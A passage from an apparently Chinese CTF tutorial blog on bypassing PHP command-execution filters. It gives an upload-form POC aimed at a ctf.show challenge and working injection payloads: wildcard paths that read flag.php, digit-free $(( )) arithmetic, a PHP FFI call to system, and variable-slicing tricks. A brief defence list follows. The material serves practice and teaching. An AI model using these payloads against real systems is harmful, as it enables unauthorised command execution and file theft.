class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>见P神文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><blockquote><p>这种方法同样适用于PHP5的时候构造无字母(因为PHP5并不像PHP7支持<code>($a)();</code>这样的方法来执行动态函数, 也就是不支持取反异或等操作)</p></blockquote><h3 id="无字母绕过"><a class="header-anchor" href="#无字母绕过">¶</a>无字母绕过</h3><p>可能还一起过滤部分字符, 我认为你还是太极端了; 这种一般用的异或、取反、自增、临时文件上传</p><h3 id="无数字绕过"><a class="header-anchor" href="#无数字绕过">¶</a>无数字绕过</h3><ol><li>利用<code>/bin/</code>目录下的<code>base64</code>进行通配符匹配, 获得flag.php文件的base64编码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure><ol start="2"><li>利用<code>/usr/bin/</code>下的<code>bzip2</code>命令，先将flag.php文件进行压缩, 然后再将其下载</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><ol start="3"><li>临时文件上传</li></ol><h3 id="极端正则"><a class="header-anchor" href="#极端正则">¶</a>极端正则</h3><ol><li><code>|.*f.*l.*a.*g.*|</code>这种过滤就是字母不能按过滤的顺序出现,</li></ol><p>这个时候利用通配符和各种替代即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /bin下可以利用对应文件执行对应指令, 利用这点绕过</span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure><ol start="2"><li>只剩下部分符号, 比如剩下$和括号</li></ol><p><code>$(())</code>的运算, 以及<a href="https://blog.csdn.net/u013402321/article/details/80333272">shell中各种括号()、(())、[]、[[]]、{}的作用和区别</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是一个构造36的payload</span><br><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>简单来说，<code>$(())</code> 用来做数学运算, 其中<code>$(($&#123;_&#125;))=0</code>, <code>$((~$(($&#123;_&#125;))))=-1</code>, 所以我们是拼接出-37在进行取反</p><h2 id="其他方法"><a class="header-anchor" href="#其他方法">¶</a>其他方法</h2><ol><li>FFI(Foreign Function Interface), 即外部函数接口</li></ol><p>FFI指在一种语言里调用另一种语言代码的技术; PHP的FFI扩展就是一个让你在PHP里调用C代码的技术, php7.4以上才有, <a href="https://www.php.net/manual/zh/ffi.cdef.php">php官方解析</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显，所以将内容输出到1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><ol start="2"><li>切片</li></ol><p>系统内置变量的切片, 可以切出我们想要的字符, 下面是<code>nl</code>命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~Q&#125;$&#123;PWD:~Q&#125; ????.???</span><br></pre></td></tr></table></figure><p>其中, <code>~</code>是从字符串末尾开始切片, 我们只需要最后那个字母, 所以只需要<code>~0</code>; 而任意的大小写字母与数字0等效, 选一个可用的字母即可</p><p>还有另一种利用类似<code>sizeof()</code>获取数字的:</p><p><code>$&#123;#var&#125;</code>的语法用于获取变量 <code>var</code> 的长度, 其实就是将这些数字应用到切片中去，绕过对数字的过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br></pre></td></tr></table></figure><h1>防御</h1><ol><li>尽量不执行外部命令</li><li>自定义函数替代外部命令</li><li>escapeshellarg函数处理将任何引起参数或命令结束的字符转义</li><li><code>saft_mode_exec_dir</code> //指定执行程序的主目录<code>safe_mode = On</code>// 打开php的安全模式<code>safe_mode_exec_dir = /usr/local/php/bin/</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
